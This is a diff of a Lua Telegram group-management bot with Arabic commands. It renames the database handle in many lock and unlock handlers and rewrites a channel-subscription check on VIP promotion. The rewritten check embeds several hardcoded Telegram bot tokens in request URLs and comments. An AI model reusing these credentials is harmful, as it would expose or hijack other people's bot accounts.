-database:del("lock_files:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:del("lock_mark:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:del("lock_photo:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:del("lock_stecker:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:del("lock_video:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:del("lock_audeo:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:del("lock_voice:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:del("lock_contact:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:del("lock_fwd:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:del("lock_link:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:del("lock_username:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:del("lock_botAndBan:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:del("lock_new:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_tag:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_sarha:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_word:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_lllll:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_gif:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_files:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_mark:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_photo:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_stecker:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_video:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_audeo:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_voice:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_contact:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_fwd:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_link:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_username:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_botAndBan:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_new:MohaMeD"..msg.chat_id_..bot_id,"ok")
 tsX000("lock",msg,"⚠️┇ تم فتح جميع الاوامر ")
 end
 if (text == "فتح الاشعارات") then
-local tsX_o = database:get("lock_new:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_new:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"⚠️┇بالفعل تم فتح الاشعارات ")
 else
 tsX000("lock",msg,"⚠️┇تم فتح الاشعارات ")
-database:del("lock_new:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_new:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "فتح التاك") then
-local tsX_o = database:get("lock_tag:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_tag:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"⚠️┇بالفعل تم فتح التاك ")
 else
 tsX000("lock",msg,"⚠️┇تم فتح التاك ")
-database:del("lock_tag:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_tag:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "فتح الرد") then
-local tsX_o = database:get("lock_reple:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_reple:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"⚠️┇بالفعل تم فتح الرد على الرسائل ")
 else
 tsX000("lock",msg,"⚠️┇تم فتح الرد على الرسائل ")
-database:del("lock_reple:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_reple:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "فتح الكلايش") then
-local tsX_o = database:get("lock_word:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_word:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"⚠️┇بالفعل تم فتح الكلايش ")
 else
 tsX000("lock",msg,"⚠️┇تم فتح الكلايش ")
-database:del("lock_word:MohaMeD"..msg.chat_id_..bot_id)
+datahmade:del("lock_word:MohaMeD"..msg.chat_id_..bot_id)
 end
 end
 
 if (text == "فتح الشارحه") then
-local tsX_o = database:get("lock_sarha:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_sarha:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"⚠️┇بالفعل تم فتح الشارحه ")
 else
 tsX000("lock",msg,"⚠️┇تم فتح الشارحه ")
-database:del("lock_sarha:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_sarha:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "فتح التكرار") then
-local tsX_o = database:get("lock_lllll:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_lllll:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"⚠️┇بالفعل تم فتح التكرار ")
 else
 tsX000("lock",msg,"⚠️┇تم فتح التكرار ")
-database:del("lock_lllll:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_lllll:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "فتح المتحركه") then
-local tsX_o = database:get("lock_gif:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_gif:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"⚠️┇بالفعل تم فتح المتحركه ")
 else
 tsX000("lock",msg,"⚠️┇تم فتح المتحركه ")
-database:del("lock_gif:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_gif:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "فتح الملفات") then
-local tsX_o = database:get("lock_files:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_files:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"⚠️┇بالفعل تم فتح الملفات ")
 else
 tsX000("lock",msg,"⚠️┇تم فتح الملفات ")
-database:del("lock_files:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_files:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "فتح الماركدون") then
-local tsX_o = database:get("lock_mark:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_mark:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"⚠️┇بالفعل تم فتح الماركدون ")
 else
 tsX000("lock",msg,"⚠️┇تم فتح الماركدون ")
-database:del("lock_mark:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_mark:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "فتح الصور") then
-local tsX_o = database:get("lock_photo:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_photo:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"⚠️┇بالفعل تم فتح الصور ")
 else
 tsX000("lock",msg,"⚠️┇تم فتح الصور ")
-database:del("lock_photo:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_photo:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "فتح الملصقات") then
-local tsX_o = database:get("lock_stecker:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_stecker:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"⚠️┇بالفعل تم فتح الملصقات ")
 else
 tsX000("lock",msg,"⚠️┇تم فتح الملصقات ")
-database:del("lock_stecker:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_stecker:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "فتح الفيديو") then
-local tsX_o = database:get("lock_video:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_video:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"⚠️┇بالفعل تم فتح الفيديو ")
 else
 tsX000("lock",msg,"⚠️┇تم فتح الفيديو ")
-database:del("lock_video:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_video:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "فتح الانلاين") then
-local tsX_o = database:get("lock_inline:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_inline:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"⚠️┇بالفعل تم فتح الانلاين ")
 else
 tsX000("lock",msg,"⚠️┇تم فتح الانلاين ")
-database:del("lock_inline:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_inline:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "فتح الدردشه") then
-local tsX_o = database:get("lock_chat:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_chat:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"⚠️┇بالفعل تم فتح الدردشه ")
 else
 tsX000("lock",msg,"⚠️┇تم فتح الدردشه ")
-database:del("lock_chat:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_chat:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "فتح التوجيه") then
-local tsX_o = database:get("lock_fwd:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_fwd:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"⚠️┇بالفعل تم فتح التوجيه ")
 else
 tsX000("lock",msg,"⚠️┇تم فتح التوجيه ")
-database:del("lock_fwd:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_fwd:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "فتح التثبيت") then
-local tsX_o = database:get("lock_pin:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_pin:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"⚠️┇بالفعل تم فتح التثبيت ")
 else
 tsX000("lock",msg,"⚠️┇تم فتح التثبيت ")
-database:del("lock_pin:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_pin:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "فتح الاغاني") then
-local tsX_o = database:get("lock_audeo:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_audeo:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"⚠️┇بالفعل تم فتح الاغاني ")
 else
 tsX000("lock",msg,"⚠️┇تم فتح الاغاني ")
-database:del("lock_audeo:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_audeo:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "فتح الصوت") then
-local tsX_o = database:get("lock_voice:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_voice:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"⚠️┇بالفعل تم فتح الصوت ")
 else
 tsX000("lock",msg,"⚠️┇تم فتح الصوت ")
-database:del("lock_voice:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_voice:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "فتح البوتات بالطرد") then
-local tsX_o = database:get("lock_botAndBan:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_botAndBan:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"⚠️┇بالفعل تم فتح البوتات بالطرد ")
 else
 tsX000("lock",msg,"⚠️┇تم فتح البوتات بالطرد ")
-database:del("lock_botAndBan:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_botAndBan:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "فتح الجهات") then
-local tsX_o = database:get("lock_contact:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_contact:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"⚠️┇بالفعل تم فتح الجهات ")
 else
 tsX000("lock",msg,"⚠️┇تم فتح الجهات ")
-database:del("lock_contact:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_contact:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "فتح العربيه") then
-local tsX_o = database:get("lock_ar:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_ar:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"⚠️┇بالفعل تم فتح العربيه ")
 else
 tsX000("lock",msg,"⚠️┇تم فتح العربيه ")
-database:del("lock_ar:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_ar:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "فتح الانكليزيه") then
-local tsX_o = database:get("lock_en:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_en:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"⚠️┇بالفعل تم فتح الانكليزيه ")
 else
 tsX000("lock",msg,"⚠️┇تم فتح الانكليزيه ")
-database:del("lock_en:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_en:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "فتح الميديا") then
-local tsX_o = database:get("lock_media:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_media:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"⚠️┇بالفعل تم فتح الميديا ")
 else
 tsX000("lock",msg,"⚠️┇تم فتح الميديا ")
-database:del("lock_media:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:del("lock_audeo:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:del("lock_video:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:del("lock_photo:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:del("lock_stecker:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:del("lock_voice:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:del("lock_gif:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:del("lock_note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_media:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_audeo:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_video:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_photo:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_stecker:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_voice:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_gif:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "فتح المعرف") then
-local tsX_o = database:get("lock_username:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_username:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"⚠️┇بالفعل تم فتح المعرف ")
 else
 tsX000("lock",msg,"⚠️┇تم فتح المعرف ")
-database:del("lock_username:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_username:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "فتح بصمه الفيديو") then
-local tsX_o = database:get("lock_note:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_note:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"⚠️┇بالفعل تم فتح بصمه فيديو ")
 else
 tsX000("lock",msg,"⚠️┇تم فتح بصمه فيديو ")
-database:del("lock_note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_note:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "فتح الروابط") then
-local tsX_o = database:get("lock_link:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_link:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"⚠️┇بالفعل تم فتح الروابط ")
 else
 tsX000("lock",msg,"⚠️┇تم فتح الروابط ")
-database:del("lock_link:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_link:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "فتح الدخول") then
-local tsX_o = database:get("lock_join:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_join:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"⚠️┇بالفعل تم فتح الدخول للمجموعه ")
 else
 tsX000("lock",msg,"⚠️┇ تم فتح الدخول للمجموعه ")
-database:del("lock_join:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_join:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "فتح البوتات") then
-local tsX_o = database:get("lock_bot:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_bot:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"⚠️┇بالفعل تم فتح البوتات ")
 else
 tsX000("lock",msg,"⚠️┇تم فتح البوتات ")
-database:del("lock_bot:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_bot:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if text and text:match('^وضع عدد الكانسر (%d+)$') then
 local Num = text:match('^وضع عدد الكانسر (%d+)$')
-database:set('MohaMeD:'..bot_id..'Num:kansers'..msg.chat_id_,Num)
+datahmade:set('MohaMeD:'..bot_id..'Num:kansers'..msg.chat_id_,Num)
 send(msg.chat_id_, msg.id_, 1, '\n🔖┇تم وضع عدد حروف الاسم {'..Num..'} حرف',1, 'md')
 end
 if (text == "قفل الكانسر") then
-local tsX_o = database:get("lock_kansers:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_kansers:MohaMeD"..msg.chat_id_..bot_id)
 if tsX_o then
 tsX000("lock",msg,"🔐┇ بالفعل تم قفل الكانسر ")
 else
 tsX000("lock",msg,"🔐┇ تم قفل الكانسر ")
-database:set("lock_kansers:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_kansers:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 if (text == "فتح الكانسر") then
-local tsX_o = database:get("lock_kansers:MohaMeD"..msg.chat_id_..bot_id)
+local tsX_o = datahmade:get("lock_kansers:MohaMeD"..msg.chat_id_..bot_id)
 if not tsX_o then
 tsX000("lock",msg,"⚠️┇بالفعل تم فتح الكانسر ")
 else
 tsX000("lock",msg,"⚠️┇تم فتح الكانسر ")
-database:del("lock_kansers:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:del("lock_kansers:MohaMeD"..msg.chat_id_..bot_id,"ok")
 end
 end
 
 if (text == ("رفع مميز"))  and msg.reply_to_message_id_ then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
-if not is_creator(msg) and database:get('MohaMeD:'..bot_id.."MohaMeD:lock:set"..msg.chat_id_) then 
+if not is_creator(msg) and datahmade:get('MohaMeD:'..bot_id.."MohaMeD:lock:set"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع الرفع تم تعطيل الرفع من قبل المنشئين \n', 1, 'md')
 return false end
 function promote_by_reply(extra, result, success)
 local hash =  'MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_
-if database:sismember(hash, result.sender_user_id_) then
+if datahmade:sismember(hash, result.sender_user_id_) then
 tsX000("prore",msg,"🔖┇تم بالفعل رفعة عضو مميز  في البوت") 
 else
-database:sadd(hash, result.sender_user_id_)
+datahmade:sadd(hash, result.sender_user_id_)
 tsX000("prore",msg,"🔖┇تم رفعة عضو مميز  في البوت")
 end
 end
@@ -5742,13 +5604,13 @@ return false
 end
 if text and text:match("^رفع مميز @(.*)$") then
 local apmd = {string.match(text, "^(رفع مميز) @(.*)$")}
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false 
 end
-if not is_creator(msg) and database:get('MohaMeD:'..bot_id.."MohaMeD:lock:set"..msg.chat_id_) then 
+if not is_creator(msg) and datahmade:get('MohaMeD:'..bot_id.."MohaMeD:lock:set"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع الرفع تم تعطيل الرفع من قبل المنشئين \n', 1, 'md')
 return false 
 end
@@ -5758,7 +5620,7 @@ if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
 SendText(msg.chat_id_,msg.id_,"*📮┇ هاذا معرف قناة \n*")   
 return false 
 end      
-database:sadd('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.id_)
+datahmade:sadd('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, result.id_)
 texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'MohaMeDTEAM')..')\n🔖┇تم رفعة عضو مميز  في البوت'
 else
 texts = '✖┇خطاء'
@@ -5771,15 +5633,15 @@ end
 
 if text and text:match("^رفع مميز (%d+)$") then
 local apmd = {string.match(text, "^(رفع مميز) (%d+)$")}
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
-if not is_creator(msg) and database:get('MohaMeD:'..bot_id.."MohaMeD:lock:set"..msg.chat_id_) then 
+if not is_creator(msg) and datahmade:get('MohaMeD:'..bot_id.."MohaMeD:lock:set"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع الرفع تم تعطيل الرفع من قبل المنشئين \n', 1, 'md')
 return false end
-database:sadd('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, apmd[2])
+datahmade:sadd('MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_, apmd[2])
 tsX000(apmd[2],msg,"🔖┇تم رفعة عضو مميز  في البوت")
 return false
 end
@@ -5787,10 +5649,10 @@ end
 if (text == ("تنزيل مميز")) and msg.reply_to_message_id_ then
 function demote_by_reply(extra, result, success)
 local hash =  'MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_
-if not database:sismember(hash, result.sender_user_id_) then
+if not datahmade:sismember(hash, result.sender_user_id_) then
 tsX000("prore",msg,"🔰┇تم تنزيله من اعضاء الممزين البوت")  
 else
-database:srem(hash, result.sender_user_id_)
+datahmade:srem(hash, result.sender_user_id_)
 tsX000("prore",msg,"🔰┇تم تنزيله من اعضاء الممزين البوت")
 end
 end
@@ -5802,7 +5664,7 @@ local hash =  'MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_
 local apmd = {string.match(text, "^(تنزيل مميز) @(.*)$")}
 function demote_by_username(extra, result, success)
 if result.id_ then
-database:srem(hash, result.id_)
+datahmade:srem(hash, result.id_)
 texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'MohaMeDTEAM')..')\n🔰┇تم تنزيله من اعضاء الممزين البوت'
 else
 texts = '✖┇خطاء'
@@ -5815,12 +5677,12 @@ end
 if text and text:match("^تنزيل مميز (%d+)$") then
 local hash =  'MohaMeD:'..bot_id..'vipgp:'..msg.chat_id_
 local apmd = {string.match(text, "^(تنزيل مميز) (%d+)$")}
-database:srem(hash, apmd[2])
+datahmade:srem(hash, apmd[2])
 tsX000(apmd[2],msg,"🔰┇تم تنزيله من اعضاء الممزين البوت")
 return false
 end  
 if text == ("حظر") and msg.reply_to_message_id_ ~= 0 then
